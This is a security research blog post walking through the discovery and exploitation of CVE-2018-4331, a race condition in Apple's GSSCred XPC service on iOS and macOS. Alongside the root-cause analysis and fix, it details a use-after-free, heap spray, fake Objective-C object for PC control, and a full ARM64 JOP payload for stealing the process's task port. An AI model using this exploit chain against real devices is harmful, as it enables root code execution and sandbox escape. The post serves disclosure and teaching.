---
layout: post
title: "An introduction to exploiting userspace race conditions on iOS"
author: Brandon Azad
date: 2018-11-08 20:45:00 -0800
category: security
tags: [iOS, macOS]
description: >
  XPC service vulnerabilities are a convenient way to elevate privileges and/or evade the sandbox.
  This post will look at a race condition in GSSCred on macOS and iOS.
---

Let's walk through the discovery and exploitation of [CVE-2018-4331][iOS 12], a race condition in
the `com.apple.GSSCred` XPC service that could be used to execute arbitrary code inside the GSSCred
process, which runs as root on macOS and iOS. The exploit, [gsscred-race], targets iOS 11.2,
although versions up through iOS 11.4.1 are vulnerable. This post will show how I discovered the
bug, how I analyzed its exploitability, and how I developed a JOP program that allowed me to take
control of the process.

[iOS 12]: https://support.apple.com/en-us/HT209106
[gsscred-race]: https://github.com/bazad/gsscred-race

<!--more-->


The vulnerability: CVE-2018-4331
---------------------------------------------------------------------------------------------------

I started looking at GSSCred after noticing that it ran as root and also provided an XPC service,
`com.apple.GSSCred`, reachable from within the iOS container sandbox. A quick Google search
confirmed that the source code was available online: GSSCred is part of Apple's [Heimdal] project.

[Heimdal]: https://opensource.apple.com/source/Heimdal/Heimdal-520.30.1/

Looking at the [source], the GSSCred service first creates a serial dispatch queue and initializes
the XPC connection listener to run on that queue:

[source]: https://opensource.apple.com/source/Heimdal/Heimdal-520.30.1/lib/heimcred/server.m.auto.html

{% highlight C %}
runQueue = dispatch_queue_create("com.apple.GSSCred", DISPATCH_QUEUE_SERIAL);
heim_assert(runQueue != NULL, "dispatch_queue_create failed");

conn = xpc_connection_create_mach_service("com.apple.GSSCred",
                                          runQueue,
                                          XPC_CONNECTION_MACH_SERVICE_LISTENER);

xpc_connection_set_event_handler(conn, ^(xpc_object_t object) {
	GSSCred_event_handler(object);
});
{% endhighlight %}

The XPC runtime will dispatch a call to `GSSCred_event_handler()` each time an event is received on
the listener connection. In particular, when a client creates a connection to `com.apple.GSSCred`
and sends the first XPC message, `GSSCred_event_handler()` will be invoked with the server-side XPC
connection object.

Using a serial dispatch queue is important because GSSCred does not use locking to protect against
parallel data accesses from multiple clients. Instead, GSSCred relies on the serial processing of
XPC events to protect against race conditions.

The `GSSCred_event_handler()` function is responsible for initializing an incoming client
connection. It creates a server-side `peer` object to represent the connection context and sets the
event handler that the XPC runtime will call when an event (such as a message from the client) is
received on the connection:

{% highlight C %}
static void GSSCred_event_handler(xpc_connection_t peerconn)
{
	struct peer *peer;

	peer = malloc(sizeof(*peer));
	heim_assert(peer != NULL, "out of memory");

	peer->peer = peerconn;
	peer->bundleID = CopySigningIdentitier(peerconn);
	if (peer->bundleID == NULL) {
		...
	}
	peer->session = HeimCredCopySession(xpc_connection_get_asid(peerconn));
	heim_assert(peer->session != NULL, "out of memory");

	xpc_connection_set_context(peerconn, peer);
	xpc_connection_set_finalizer_f(peerconn, peer_final);

	xpc_connection_set_event_handler(peerconn, ^(xpc_object_t event) {
		GSSCred_peer_event_handler(peer, event);
	});
	xpc_connection_resume(peerconn);
}
{% endhighlight %}

When I saw this code, I noticed that the typical call to `xpc_connection_set_target_queue()` was
missing: in code like this, you'd usually see the target dispatch queue for the new connection to
the client (`peerconn` in the code) explicitly being set to the same queue on which the listener
runs (`runQueue`). It wasn't immediately obvious whether this was problematic, so I decided to
check the documentation.

Here's what `xpc/connection.h` has to say about `xpc_connection_set_event_handler()`:

	Connections received by listeners are equivalent to those returned by
	xpc_connection_create() with a non-NULL name argument and a NULL targetq
	argument with the exception that you do not hold a reference on them.
	You must set an event handler and activate the connection.

And here's the documentation from `xpc_connection_create()` about the `targetq` parameter:

	@param targetq
	The GCD queue to which the event handler block will be submitted. This
	parameter may be NULL, in which case the connection's target queue will be
	libdispatch's default target queue, defined as DISPATCH_TARGET_QUEUE_DEFAULT.
	The target queue may be changed later with a call to
	xpc_connection_set_target_queue().

This means we do have a problem: `peerconn`'s target queue will be to libdispatch's default target
queue, `DISPATCH_TARGET_QUEUE_DEFAULT`, which is a concurrent queue. Even though connections to
GSSCred will be received serially, requests from different clients may be executed concurrently.

Put another way, setting the target queue only on the listener connection is not sufficient: client
connections will be received serially in `GSSCred_event_handler()`, but
`GSSCred_peer_event_handler()` could run in parallel for different clients.

The XPC documentation about concurrent execution of event handlers in different clients may be
misleading at first glance. The documentation for `xpc_connection_set_target_queue()` states:

	The XPC runtime guarantees this non-preemptiveness even for concurrent target
	queues. If the target queue is a concurrent queue, then XPC still guarantees
	that there will never be more than one invocation of the connection's event
	handler block executing concurrently. If you wish to process events
	concurrently, you can dispatch_async(3) to a concurrent queue from within
	the event handler.

It's important to understand that this guarantee is strictly per-connection: event handler blocks
for different connections, even if they share the same underlying code, are considered different
event handler blocks and are allowed to run concurrently.

The fix for this issue in GSSCred is to insert a call to `xpc_connection_set_target_queue()` before
activating the client connection with `xpc_connection_resume()` to set the target queue for the
client connection to the serial queue created earlier. For example:

{% highlight C %}
xpc_connection_set_event_handler(peerconn, ^(xpc_object_t event) {
	GSSCred_peer_event_handler(peer, event);
});
xpc_connection_set_target_queue(peerconn, runQueue);		// added
xpc_connection_resume(peerconn);
{% endhighlight %}

This will guarantee that all client requests across all connections will be handled serially.


Analyzing the race
---------------------------------------------------------------------------------------------------

The vulnerability is that multiple clients can connect to GSSCred and cause
`GSSCred_peer_event_handler()` to execute in parallel on different threads. Thus, in order to
exploit the vulnerability, we want to look for race conditions in `GSSCred_peer_event_handler()`.

Fortunately, and unfortunately, there are a lot of them. Because GSSCred was written under the
assumption that it would execute serially, any access to shared data is a potential race.

`GSSCred_peer_event_handler()` reads the `"command"` property from the XPC message and dispatches
to the corresponding implementation:

| Command               | Function          |
| --------------------- | ----------------- |
| `"wakeup"`            |                   |
| `"create"`            | `do_CreateCred()` |
| `"delete"`            | `do_Delete()`     |
| `"setattributes"`     | `do_SetAttrs()`   |
| `"fetch"`             | `do_Fetch()`      |
| `"move"`              | `do_Move()`       |
| `"query"`             | `do_Query()`      |
| `"default"`           | `do_GetDefault()` |
| `"retain-transient"`  |                   |
| `"release-transient"` |                   |
| `"status"`            | `do_Status()`     |

When searching for race conditions, you usually want at least one of two properties: either the
race should be easy to win, or the race should be safe to lose. In the first case, you want a high
probability of winning the race and achieving the desired outcome. In the second case, you want to
be able to retry the race over and over again until you get it right, and not have to worry about
getting it wrong.

Looking at the functions above, most of the shared data accesses are to the `peer` object, which
represents the server-side state of the client. There are no obvious candidates for data
races that are safe: every race I could find relied on reallocating memory with controlled data,
which is racy and prone to causing crashes.

However, several of the functions do process controlled data in a loop, which gives us a way to
prolong their execution. For example, `do_CreateCred()` and `do_SetAttrs()` will convert a
controlled XPC dictionary into a CoreFoundation dictionary, `do_Delete()` will remove an arbitrary
number of credential objects, `do_Query()` will search through all available credentials, etc. By
increasing the number of items on which these functions operate, we can delay certain parts of
their execution. Hopefully this delay occurs inside a useful race window, giving us more time to
win the race.

After much experimentation to determine the candidate race most likely to succeed, I eventually
settled on calling `do_SetAttrs()` with a large attributes dictionary on a credential in thread 1,
while invoking `do_Delete()` to delete the credential in thread 2, causing a use-after-free in
thread 1 after it finishes processing the attributes dictionary.


Creating a use-after-free
---------------------------------------------------------------------------------------------------

The `do_SetAttrs()` function handles the `"setattributes"` command from the client. Here is the
code (edited for presentation):

{% highlight C %}
static void
do_SetAttrs(struct peer *peer, xpc_object_t request, xpc_object_t reply)
{
	CFUUIDRef uuid = HeimCredCopyUUID(request, "uuid");
	CFMutableDictionaryRef attrs;
	CFErrorRef error = NULL;

	if (uuid == NULL)
		return;

	if (!checkACLInCredentialChain(peer, uuid, NULL)) {
		CFRelease(uuid);
		return;
	}

	HeimCredRef cred = (HeimCredRef)CFDictionaryGetValue(	// (a) The credential
			peer->session->items, uuid);		//     pointer is copied to
	CFRelease(uuid);					//     a local variable.
	if (cred == NULL)
		return;

	heim_assert(CFGetTypeID(cred) == HeimCredGetTypeID(),
			"cred wrong type");

	if (cred->attributes) {
		attrs = CFDictionaryCreateMutableCopy(NULL, 0,
				cred->attributes);
		if (attrs == NULL)
			return;
	} else {
		attrs = CFDictionaryCreateMutable(NULL, 0,
				&kCFTypeDictionaryKeyCallBacks,
				&kCFTypeDictionaryValueCallBacks);
	}

	CFDictionaryRef replacementAttrs =			// (b) The attributes dict
		HeimCredMessageCopyAttributes(			//     is deserialized from
				request, "attributes",		//     the XPC message.
				CFDictionaryGetTypeID());
	if (replacementAttrs == NULL) {
		CFRelease(attrs);
		goto out;
	}

	CFDictionaryApplyFunction(replacementAttrs,
			updateCred, attrs);
	CFRELEASE_NULL(replacementAttrs);

	if (!validateObject(attrs, &error)) {			// (c) The deserialized
		addErrorToReply(reply, error);			//     attributes dict is
		goto out;					//     validated.
	}

	handleDefaultCredentialUpdate(peer->session,		// (d) The credential
			cred, attrs);				//     pointer from (a) is
								//     used.
	// make sure the current caller is on the ACL list
	addPeerToACL(peer, attrs);

	CFRELEASE_NULL(cred->attributes);
	cred->attributes = attrs;
out:
	CFRELEASE_NULL(error);
}
{% endhighlight %}

Since we fully control the contents of the XPC request, we can make (most) deserialization commands
take a long time to run, which opens a nice wide race window. Here in `do_SetAttrs()` the
`HeimCredMessageCopyAttributes()` function performs deserialization, giving us an opportunity to
change the program state in another thread during its execution.

To unexpectedly change the program state while `do_SetAttrs()` is stalled, we will use a separate
connection to call the `do_Delete()` function. This function is responsible for handling a
`"delete"` command from the client. It will delete all credentials matching the deletion query. We
can send a `"delete"` request to free the credential pointer held by `do_SetAttrs()` while the
latter is busy deserializing in `HeimCredMessageCopyAttributes()`.

Using these two functions, the race condition flow goes like this:

1. Create the HeimCred credential object we will use for the UAF by sending a `"create"` request.
2. Send a `"setattributes"` request for the target credential with an attributes dictionary that
   will take a long time to deserialize. A pointer to the HeimCred will be saved on the stack (or
   in a register) while `HeimCredMessageCopyAttributes()` is deserializing, allocating objects in a
   tight loop.
3. While `do_SetAttrs()` is still in the allocation loop, send a `"delete"` request on a second
   connection to delete the target credential. This second connection's event handler will run on
   another thread and free the HeimCred. The freed HeimCred object will be added to the heap
   freelist.
4. If we're lucky, back in the first connection's thread, the freed HeimCred object will be
   reallocated by `HeimCredMessageCopyAttributes()` to store deserialized data from the attributes
   dictionary, giving us control over some of the fields of the freed HeimCred.
5. Eventually `HeimCredMessageCopyAttributes()` finishes and `do_SetAttrs()` resumes, not knowing
   that the contents of the HeimCred pointer it stored earlier have been changed. It passes the
   pointer to the corrupted HeimCred to `handleDefaultCredentialUpdate()` and all hell breaks
   loose.

Thus, we have used the race condition to create a use-after-free. However, in order for this
technique to work, we need to ensure that the freed HeimCred object gets reallocated and
overwritten with controlled contents.


Corrupting the HeimCred
---------------------------------------------------------------------------------------------------

Now let's talk about how exactly we're going to overwrite the HeimCred object. Here's the structure
definition:

{% highlight C %}
struct HeimCred_s {
	CFRuntimeBase   runtime;	// 00: 0x10 bytes
	CFUUIDRef       uuid;		// 10: 8 bytes
	CFDictionaryRef attributes;	// 18: 8 bytes
	HeimMech *      mech;		// 20: 8 bytes
};					// Total: 0x28 bytes
{% endhighlight %}

Since the full structure is `0x28` bytes, it will be allocated from and freed to the `0x30`
freelist, which is used for heap objects between `0x20` and `0x30` bytes in size. This means that
whatever deserialization is happening in `HeimCredMessageCopyAttributes()`, we'll need to ensure
that it allocates from the `0x30` freelist in a tight loop, allowing the freed HeimCred to be
reused.

However, we can't pass just anything to `HeimCredMessageCopyAttributes()`: we also need the
deserialized dictionary to pass the call to `validateObject()` later on. Otherwise, even if we
manage to corrupt the HeimCred object, it won't be used afterwards, rendering our exploit
pointless.

It turns out the only way we can both allocate objects in an unbounded loop and pass the
`validateObject()` check is by supplying an attributes dictionary containing an array of strings
under the `"kHEIMAttrBundleIdentifierACL"` key. All other unbounded collections will be rejected by
`validateObject()`. Thus, the only objects we can allocate in a loop are `OS_xpc_string`, the
object type for an XPC string, and `CFString`, the CoreFoundation string type.

(This isn't quite true: we could, for example, play tricks with a serialized XPC dictionary with
colliding keys such that some objects we allocate don't end up in the final collection. However, I
tried to limit myself to the official XPC API and legal XPC objects. If you remove this
restriction, you can probably significantly improve the exploit.)

Fortunately for us, both `OS_xpc_string` and `CFString` (for certain string lengths) are also
allocated out of the `0x30` freelist. It's possible to target either data structure for the
exploit, but I eventually settled on `CFString` because it seems easier to win the corresponding
race window.

Immutable `CFString` objects are allocated with their character data inline. This is what the
structure looks like for short strings:

{% highlight C %}
struct CFString {
	CFRuntimeBase   runtime;	// 00: 0x10 bytes
	uint8_t         length;		// 10: 1 byte
	char            characters[1];	// 11: variable size
};
{% endhighlight %}

Thus, if we use strings between `0x10` and `0x1f` bytes long (including the null terminator), the
`CFString` objects will be allocated out of the `0x30` freelist, potentially allowing us to control
some fields of the freed `HeimCred` object.

For the use-after-free to be exploitable we want the part of the `CFString` that we control to
overlap the fields of `HeimCred`, such that creating the `CFString` will corrupt the `HeimCred`
object in an interesting way. Looking back to the definition of the `HeimCred` structure, we can
see that the `uuid`, `attributes`, and `mech` fields are all possibly controllable.

However, all three of these fields are pointers, and userspace pointers on iOS usually contain null
bytes. Our `CFString` will end at the first null byte, so in order to remain in the `0x30` freelist
the first null byte must occur at or after offset `0x20`. This means the `uuid` and `attributes`
fields will have to be null-free, making them less promising exploit targets (since valid userspace
pointers usually contain null bytes). Hence `mech` is the natural choice. We will try to get the
corrupted `HeimCred`'s `mech` field to point to memory whose contents we control.


Pointing to controlled data
---------------------------------------------------------------------------------------------------

Where exactly will we make `mech` point?

We want `mech` to point to memory we control, but due to ASLR we don't know any addresses in the
GSSCred process. The traditional way to bypass ASLR when we don't know where our allocations will
be placed is using a heap spray. However, this presents two problems. First, performing a
traditional heap spray over XPC would be quite slow, since the kernel would need to copy a huge
amount of data from our address space into GSSCred's address space. Second, on iOS the GSSCred
process has a strict memory limit of around 6 megabytes, after which it is at risk of being killed
by Jetsam. 6 MB is nowhere near enough to perform an effective heap spray, especially since
our serialized attributes dictionary will already be allocating thousands of strings to enlarge our
race window.

Fortunately for us, libxpc contains an optimization that solves both problems: if we're sending an
XPC data object larger than `0x4000` bytes, libxpc will instead create a Mach memory entry
representing the data and send that to the target instead. Then, when the message is deserialized
in the recipient, libxpc will map the memory entry directly into the recipient's address space by
calling `mach_vm_map()`. The result is a fast, copy-free duplication of our memory in the recipient
process's address space. And because the physical pages are shared, they don't count against
GSSCred's memory limit. (See Ian Beer's [triple_fetch] exploit, which is where I learned of this
technique and where I derived some of the initial parameters I used in my exploit.)

[triple_fetch]: https://bugs.chromium.org/p/project-zero/issues/detail?id=1247

Since libxpc calls `mach_vm_map()` with the `VM_FLAGS_ANYWHERE` flag, the kernel will choose the
address of the mapping. Presumably to minimize address space fragmentation, the kernel will
typically choose an address close to the program base. The program base is usually located at an
address like `0x000000010c65d000`: somewhere above but close to 4GB (`0x100000000`), with the exact
address randomized by ASLR. The kernel might then place large `VM_ALLOCATE` objects at an address
like `0x0000000116097000`: after the program, but still fairly close to `0x100000000`. By
comparison, the `MALLOC_TINY` heap (which is where all of our objects will live) might start at
`0x00007fb6f0400000` on macOS and `0x0000000107100000` on iOS.

Using a memory entry heap spray, we can fill a gigabyte or more of GSSCred's virtual memory space
with controlled data. (Choosing the exact parameters was a frustrating exercise in guess-and-check,
because for unknown reasons certain configurations of the heap spray work well and others do not.)
Because the sprayed data will follow closely behind the program base, there's a good chance that
addresses close to `0x0000000120000000` will contain our sprayed data.

This means we'll want our corrupted `mech` field to contain a pointer like `0x0000000120000000`.
Once again, we need to address problems with null bytes.

Recall that the `mech` field is actually part of a `CFString` object that overwrites the freed
`HeimCred` pointer. Thus, the first null byte will terminate the string and all bytes after that
will retain whatever value they originally had in the `HeimCred` object.

Fortunately, because current macOS and iOS platforms are all little-endian, the pointer is laid out
least significant byte to most significant byte. If instead we use an address like
`0x0000000120202020` (with all the null bytes at the start) for our controlled data, then the lower
5 bytes of the address will be copied into the `mech` field, and the null terminator will zero out
the 6th. This leaves just the 2 high bytes of the `mech` field with whatever value they had
originally.

However, we know that the `mech` field was originally a heap pointer into the `MALLOC_TINY` heap,
and `MALLOC_TINY` pointers on both macOS and iOS start with 2 zero bytes. Thus, even though we can
only write to the lower 6 bytes, we know that the upper 2 bytes will always have the value we want.

This means we have a way to get controlled data at a known address in the GSSCred process and can
make the `mech` field point to that data. Getting control of PC is simply a matter of choosing the
right data.


Controlling PC
---------------------------------------------------------------------------------------------------

We fully control the data pointed to by the `mech` field, so we can construct a fake `HeimMech`
object. Here's the `HeimMech` structure:

{% highlight C %}
struct HeimMech {
	CFRuntimeBase           runtime;		// 00: 0x10 bytes
	CFStringRef             name;			// 10: 8 bytes
	HeimCredStatusCallback  statusCallback;		// 18: 8 bytes
	HeimCredAuthCallback    authCallback;		// 20: 8 bytes
};
{% endhighlight %}

All of these fields are attractive targets. Controlling the `isa` pointer of an Objective-C object
allows us to gain code execution if an Objective-C message is sent to the object (see Phrack,
[Modern Objective-C Exploitation Techniques]). And the last 2 fields are pointers to callback
functions, which is an even easier route to PC control (if we can get them called).

[Modern Objective-C Exploitation Techniques]: http://phrack.org/issues/69/9.html

To determine which field or fields are of interest, we need to look at how the corrupted `HeimCred`
is used. The first time it is used after the call to `HeimCredMessageCopyAttributes()` is when it
is passed as a parameter to `handleDefaultCredentialUpdate()`.

Here's the source code of `handleDefaultCredentialUpdate()`, with some irrelevant code removed:

{% highlight C %}
static void
handleDefaultCredentialUpdate(struct HeimSession *session,
		HeimCredRef cred, CFDictionaryRef attrs)
{
	heim_assert(cred->mech != NULL, "mech is NULL, "	// (e) mech must not be
			"schame validation doesn't work ?");	//     NULL.

	CFUUIDRef oldDefault = CFDictionaryGetValue(		// (f) Corrupted name
			session->defaultCredentials,		//     pointer passed to
			cred->mech->name);			//     CF function.

	CFBooleanRef defaultCredential = CFDictionaryGetValue(
			attrs, kHEIMAttrDefaultCredential);
	...

	CFDictionarySetValue(session->defaultCredentials,
			cred->mech->name, cred->uuid);

	notifyChangedCaches();
}
{% endhighlight %}

Since we will make the corrupted HeimCred's `mech` field point to our heap spray data, it will
never be `NULL`, so the assertion will pass. Next, the `mech` field will be dereferenced to read
the `name` pointer, which is passed to `CFDictionaryGetValue()`. This is perfect: we can make our
fake HeimMech's `name` pointer also point into the heap spray data. We will construct a fake
Objective-C object such that when `CFDictionaryGetValue()` sends a message to it we end up with PC
control.

As it turns out, `CFDictionaryGetValue()` will send an Objective-C message with the `hash` selector
to its second argument. We can construct our fake `name` object so that its `isa` pointer indicates
that it responds to the `hash` selector with an Objective-C method whose implementation pointer
contains the PC value we want. For more complete details, refer to the [Phrack article][Modern
Objective-C Exploitation Techniques].

So, in summary, we can corrupt the HeimCred object such that its `mech` pointer points to a fake
HeimMech object, and the HeimMech's `name` field points to a fake Objective-C object whose contents
we fully control. The `name` pointer will be passed to `CFDictionaryGetValue()`, which will invoke
`objc_msgSend()` on the `name` pointer for the `hash` selector. The `name` object's `isa` pointer
will point to an `objc_class` object that indicates that `name` responds to the `hash` selector
with a particular method implementation. When `objc_msgSend()` invokes that method, we get PC
control, with the `name` pointer as the first argument.


Getting GSSCred's task port
---------------------------------------------------------------------------------------------------

Controlling PC alone is not enough. We also need to construct a payload to execute in the context
of the GSSCred process that will accomplish useful work. In our case, we will try to make GSSCred
give us a send right to its task port, allowing us to manipulate the process without having to
re-exploit the race condition each time. Here we will describe the ARM64 payload.

When we get PC control, the `X0` register will point to the fake `name` object. The `name` object's
`isa` pointer is already determined by the part of the payload that gets PC control, but everything
after the first 8 bytes can be used by the ARM64 payload. We can write our exploit payload as a
jump-oriented program.

Borrowing a technique from triple_fetch, I wanted to have the exploit payload send a Mach message
containing GSSCred's task port from GSSCred back to our process. The challenge is that we don't
know what port to send this message to, such that we can receive the message back in our process.
We could create a Mach port in our process to which we have the receive right, then send the
corresponding send right over to GSSCred, but we don't know what port name the kernel will assign
that send right over in GSSCred.

The triple_fetch exploit gets around this limitation by sending a message with thousands of Mach
send rights, spraying the target's Mach port namespace so that with high probability one of the
hardcoded Mach port names used in the payload will be a send right back to the exploiting process.

I decided to try the inverse: send a single Mach send right to GSSCred, then have the exploit
payload try to send the Mach message to thousands of different Mach port names, hopefully hitting
the one corresponding to the send right back to our process. One prominent advantage of this design
is that it can take up significantly less space (we no longer need a massive Mach port spray, and
the ARM64-specific part of the payload could easily be packed down to 400 bytes).

The other strategy I was contemplating was to try and deduce the Mach send right name directly,
either by working backwards from the current register values or stack contents or by scanning
memory. However, this seemed more complicated and more fragile than simply spraying Mach messages
to every possible port name.

Once GSSCred sends all the Mach messages, we need to finish in a way that doesn't cause GSSCred to
crash. Since it seemed difficult to repair the corruption and resume executing from where we
hijacked control, the exploit payload simply enters an infinite loop. This means that GSSCred will
never reply to the "setattributes" request that caused the exploit payload to be executed.

Back in our process, we can listen on the receiving end of the Mach port we sent to GSSCred for a
message. If a message is received, that means we won the race and the exploit succeeded.

Here's the JOP payload I used:

	ENTRY:
		REGION_ARG1 = {
			 0 : ISA (generic payload)
			20 : _longjmp
			28 : REGION_JMPBUF
		}
		REGION_JMPBUF = {
			 0 : x19 = REGION_X19
			 8 : x20 = INITIAL_REMOTE_AND_LOCAL_PORT
			10 : x21 = PORT_INCREMENT
			18 : x22 = JOP_STACK_FINALIZE
			20 : x23 = mach_msg_send
			28 : x24 = JOP_STACK_SEND_MACH_MESSAGE_AND_LOOP
			30 : x25 = LDP_X8_X2_X19__BLR_X8
			38 : x26 = MAX_REMOTE_AND_LOCAL_PORT
			40 : x27 = REGION_MACH_MESSAGE
			58 : x30 = LDP_X8_X2_X19__BLR_X8
			68 : sp = FAKE_STACK_ADDRESS
		}
		REGION_X19 = {
			 0 : LDP_X3_X2_X2__BR_X3
			 8 : JOP_STACK_INCREMENT_PORT_AND_BRANCH
			10 : BLR_X8
			78 = REGION_MACH_MESSAGE
			80 : REGION_MACH_MESSAGE[8]
		}
		REGION_MACH_MESSAGE = {
			 0 : msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_COPY_SEND, 0, 0);
			 4 : msgh_size = sizeof(mach_msg_header_t) = 0x18
			 8 : msgh_remote_port
			 c : msgh_local_port
			10 : msgh_voucher_port = 0
			14 : msgh_id = GSSCRED_RACE_MACH_MESSAGE_ID
		}
		JOP_STACK_INCREMENT_PORT_AND_BRANCH = [
			ADD_X1_X21_X20__BLR_X8
			MOV_X20_X1_BLR_X8
			STR_X1_X19_80__BLR_X8
			MOV_X0_X26__BLR_X8
			SUB_X1_X1_X0__BLR_X8
			MOV_X13_X1__BR_X8
			MOV_X9_X13__BR_X8
			MOV_X11_X24__BR_X8
			CMP_X9_0__CSEL_X1_X10_X9_EQ__BLR_X8
			MOV_X9_X22__BR_X8
			CSEL_X2_X11_X9_LT__BLR_X8
		]
		JOP_STACK_SEND_MACH_MESSAGE_AND_LOOP = [
			MOV_X0_X27__BLR_X8
			BLR_X23__MOV_X0_X21__BLR_X25
		]
		JOP_STACK_FINALIZE = [
			LDR_X8_X19_10__BLR_X8
		]
		x0 = REGION_ARG1
		pc = LDP_X1_X0_X0_20__BR_X1

	;; We get control of PC with X0 pointing to a fake "name" Objective-C object.
	;; The isa pointer is managed by the generic part of the payload, but
	;; everything after that is usable for the arm64 payload.
	;;
	;; Before entering the main loop, we need to set registers x19 through x27. We
	;; could try to preserve the callee-saved registers and x29, x30, and sp so
	;; that our caller could resume after the exploit payload runs, but it's easier
	;; to just obliterate these registers and permanently stall this thread so that
	;; the corruption never manifests a crash. Unfortunately, this also means we
	;; leak all associated resources, so we have only one shot before we risk
	;; violating the Jetsam limit.
	;;
	;; We need to set the following register values:
	;; 	x19 = REGION_X19
	;; 	x20 = INITIAL_REMOTE_AND_LOCAL_PORT
	;; 	x21 = PORT_INCREMENT
	;; 	x22 = JOP_STACK_FINALIZE
	;; 	x23 = mach_msg_send
	;; 	x24 = JOP_STACK_SEND_MACH_MESSAGE_AND_LOOP
	;; 	x25 = LDP_X8_X2_X19__BLR_X8
	;; 	x26 = MAX_REMOTE_AND_LOCAL_PORT
	;; 	x27 = REGION_MACH_MESSAGE

	LDP_X1_X0_X0_20__BR_X1 (common):
			ldp x1, x0, [x0, #0x20]
			br x1
		x1 = REGION_ARG1[20] = _longjmp
		x0 = REGION_ARG1[28] = REGION_JMPBUF

	_longjmp:
		x19 = REGION_X19
		x20 = INITIAL_REMOTE_AND_LOCAL_PORT
	 	x21 = PORT_INCREMENT
	 	x22 = JOP_STACK_FINALIZE
	 	x23 = mach_msg_send
	 	x24 = JOP_STACK_SEND_MACH_MESSAGE_AND_LOOP
	 	x25 = LDP_X8_X2_X19__BLR_X8
	 	x26 = MAX_REMOTE_AND_LOCAL_PORT
	 	x27 = REGION_MACH_MESSAGE
		x30 = LDP_X8_X2_X19__BLR_X8
		sp = FAKE_STACK_ADDRESS
		pc = LDP_X8_X2_X19__BLR_X8

	;; We are about to enter the main loop, which will repeatedly send Mach
	;; messages containing the the current process's task port to incrementing
	;; remote port numbers.
	;;
	;; These are the registers during execution:
	;; 	x2 = Current JOP stack position
	;; 	x3 = Current gadget
	;; 	x8 = LDP_X3_X2_X2__BR_X3
	;; 	x20 = CURRENT_REMOTE_AND_LOCAL_PORT

	LDP_X8_X2_X19__BLR_X8 (CoreUtils):
			ldp x8, x2, [x19]
			blr x8
		x8 = REGION_X19[0] = LDP_X3_X2_X2__BR_X3
		x2 = REGION_X19[8] = JOP_STACK_INCREMENT_PORT_AND_BRANCH
		pc = LDP_X3_X2_X2__BR_X3

	;; This is our dispatch gadget. It reads gadgets to execute from a "linked
	;; list" JOP stack.

	LDP_X3_X2_X2__BR_X3 (CoreFoundation, Heimdal):
			ldp x3, x2, [x2]
			br x3
		x3 = ADD_X1_X21_X20__BLR_X8
		pc = ADD_X1_X21_X20__BLR_X8

	;; The first JOP stack we execute is JOP_STACK_INCREMENT_PORT_AND_BRANCH. We
	;; increment the remote Mach port via a register containing the combined remote
	;; and local port numbers, test if the remote Mach port is above the limit, and
	;; branch to either send the message and loop again or finish running the
	;; exploit payload.

	ADD_X1_X21_X20__BLR_X8 (libxml2):
			add x1, x21, x20
			blr x8
		x1 = CURRENT_REMOTE_AND_LOCAL_PORT + PORT_INCREMENT = NEXT_REMOTE_AND_LOCAL_PORT
		pc = LDP_X3_X2_X2__BR_X3
		pc = MOV_X20_X1_BLR_X8

	MOV_X20_X1_BLR_X8 (libswiftCore, MediaPlayer):
			mov x20, x1
			blr x8
		x20 = NEXT_REMOTE_AND_LOCAL_PORT
		pc = LDP_X3_X2_X2__BR_X3
		pc = STR_X1_X19_80__BLR_X8

	STR_X1_X19_80__BLR_X8 (libswiftCore):
			str x1, [x19, #0x80]
			blr x8
		REGION_X19[80] = REGION_MACH_MESSAGE[8] = NEXT_REMOTE_AND_LOCAL_PORT
		pc = LDP_X3_X2_X2__BR_X3
		pc = MOV_X0_X26__BLR_X8

	MOV_X0_X26__BLR_X8 (common):
			mov x0, x26
			blr x8
		x0 = MAX_REMOTE_AND_LOCAL_PORT
		pc = LDP_X3_X2_X2__BR_X3
		pc = SUB_X1_X1_X0__BLR_X8

	SUB_X1_X1_X0__BLR_X8 (libswiftCore):
			sub x1, x1, x0
			blr x8
		x1 = NEXT_REMOTE_AND_LOCAL_PORT - MAX_REMOTE_AND_LOCAL_PORT
		pc = LDP_X3_X2_X2__BR_X3
		pc = MOV_X13_X1__BR_X8

	MOV_X13_X1__BR_X8 (CloudKitDaemon, MediaToolbox):
			mov x13, x1
			br x8
		x13 = NEXT_REMOTE_AND_LOCAL_PORT - MAX_REMOTE_AND_LOCAL_PORT
		pc = LDP_X3_X2_X2__BR_X3
		pc = MOV_X9_X13__BR_X8

	MOV_X9_X13__BR_X8 (AirPlaySender, SafariShared):
			mov x9, x13
			br x8
		x9 = NEXT_REMOTE_AND_LOCAL_PORT - MAX_REMOTE_AND_LOCAL_PORT
		pc = LDP_X3_X2_X2__BR_X3
		pc = MOV_X11_X24__BR_X8

	MOV_X11_X24__BR_X8 (AirPlayReceiver, CloudKitDaemon):
			mov x11, x24
			br x8
		x11 = JOP_STACK_SEND_MACH_MESSAGE_AND_LOOP
		pc = LDP_X3_X2_X2__BR_X3
		pc = CMP_X9_0__CSEL_X1_X10_X9_EQ__BLR_X8

	;; Compare x9 (NEXT_REMOTE_AND_LOCAL_PORT - MAX_REMOTE_AND_LOCAL_PORT) to 0. If
	;; x9 is less than 0, then NEXT_REMOTE_AND_LOCAL_PORT is less than
	;; MAX_REMOTE_AND_LOCAL_PORT, and so we should send the message and loop again.
	;; Otherwise, we should exit the loop.

	CMP_X9_0__CSEL_X1_X10_X9_EQ__BLR_X8 (TextInputCore):
			cmp x9, #0
			csel x1, x10, x9, eq
			blr x8
		nzcv = CMP(NEXT_REMOTE_AND_LOCAL_PORT - MAX_REMOTE_AND_LOCAL_PORT, 0)
		x1 = CLOBBER
		pc = LDP_X3_X2_X2__BR_X3
		pc = MOV_X9_X22__BR_X8

	MOV_X9_X22__BR_X8 (MediaToolbox, StoreServices):
			mov x9, x22
			br x8
		x9 = JOP_STACK_FINALIZE
		pc = LDP_X3_X2_X2__BR_X3
		pc = CSEL_X2_X11_X9_LT__BLR_X8

	CSEL_X2_X11_X9_LT__BLR_X8 (AppleCVA, libLLVM):
			csel x2, x11, x9, lt
			blr x8
		if (NEXT_REMOTE_AND_LOCAL_PORT < MAX_REMOTE_AND_LOCAL_PORT)
			x2 = JOP_STACK_SEND_MACH_MESSAGE_AND_LOOP
		else
			x2 = JOP_STACK_FINALIZE
		pc = LDP_X3_X2_X2__BR_X3
		if (NEXT_REMOTE_AND_LOCAL_PORT < MAX_REMOTE_AND_LOCAL_PORT)
			pc = JOP_STACK_SEND_MACH_MESSAGE_AND_LOOP[0]
		else
			pc = JOP_STACK_FINALIZE[0]
